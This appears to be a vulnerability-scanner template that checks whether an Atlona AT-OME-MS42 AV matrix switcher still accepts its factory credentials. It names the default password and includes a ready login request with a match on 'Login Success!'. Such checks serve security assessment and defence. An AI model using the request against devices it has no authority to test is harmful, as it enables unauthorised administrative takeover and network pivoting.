id: atlona-default-login

info:
  name: Atlona AT-OME-MS42 - Default Login
  author: matejsmycka
  severity: high
  description: |
    The Atlona AT-OME-MS42, a 4x2 matrix switcher supporting HDMI, USB-C, and DisplayPort inputs, is accessible via a built-in web management interface. By default, this interface uses the factory-set credentials admin:Atlona. If left unchanged, attackers could gain unauthorized administrative access to the device, potentially allowing them to alter configurations, disrupt AV switching, or pivot further into the network.
  reference:
    - https://atlona.com/pdf/manuals/AT-OME-MS42_G.pdf
  tags: atlona,default-login,vuln

http:
  - raw:
      - |
        POST /cgi-bin/login.cgi?ssid={{base64('admin:Atlona')}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic undefined
        X-Requested-With: XMLHttpRequest
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/json
        Cookie: SSID=

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "Login Success!")'
          - 'contains(content_type, "application/json")'
          - 'status_code == 200'
        condition: and
# digest: 4a0a0047304502207774350e044effdc5816f9882560b1d206d215ea4660d75ebe52b30d722a1ed3022100e551735669e5ad302c4d563b5147f033141393f2f327b92e6a3071f980e175ee:922c64590222798bb761d5b6d8e72950